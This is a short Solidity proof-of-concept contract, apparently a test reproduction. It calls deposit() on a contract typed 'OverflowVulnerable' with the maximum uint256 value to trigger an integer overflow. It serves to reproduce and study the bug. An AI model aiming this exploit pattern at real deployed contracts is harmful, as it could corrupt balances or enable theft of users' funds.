contract Reproduction {
    OverflowVulnerable public target;
    
    constructor(address _target) {
        target = OverflowVulnerable(_target);
    }

    function exploit() public {
        uint256 maxUint = type(uint256).max;
        target.deposit(maxUint);
    }
}